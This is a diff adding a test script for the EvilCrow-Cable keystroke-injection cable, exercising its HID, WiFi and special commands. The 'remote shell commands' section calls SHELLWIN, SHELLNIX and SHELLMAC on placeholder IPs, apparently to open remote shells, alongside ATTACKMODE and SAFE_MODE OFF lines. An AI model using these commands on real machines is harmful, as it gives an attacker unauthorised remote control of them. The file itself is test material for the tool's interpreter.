@@ -1,0 +1,48 @@
+# EvilCrow-Cable Specialty Commands Test
+# This payload tests all the new EvilCrow-Cable specific commands
+
+# Basic HID commands
+STRING Hello from EvilCrow-Cable!
+ENTER
+DELAY 1000
+
+# Test RELEASE command
+CTRL
+SHIFT
+DELAY 500
+RELEASE
+DELAY 500
+
+# Test WiFi commands
+WIFI_SEND Hello WiFi World!
+DELAY 1000
+WIFI_CONNECT MyNetwork MyPassword
+DELAY 2000
+
+# Test remote shell commands
+SHELLWIN 192.168.1.100
+DELAY 1000
+SHELLNIX 192.168.1.101
+DELAY 1000
+SHELLMAC 192.168.1.102
+DELAY 1000
+
+# Test ATTACKMODE with WiFi
+ATTACKMODE HID WIFI
+DELAY 1000
+
+# Test modifier combos
+MOD r
+DELAY 500
+CTRL ALT DEL
+DELAY 1000
+
+# Test advanced commands
+RANDOM_DELAY 100 500
+LOG EvilCrow-Cable test completed
+VALIDATE WiFi module connected
+SAFE_MODE OFF
+
+# Final test
+STRING EvilCrow-Cable test payload completed!
+ENTER 
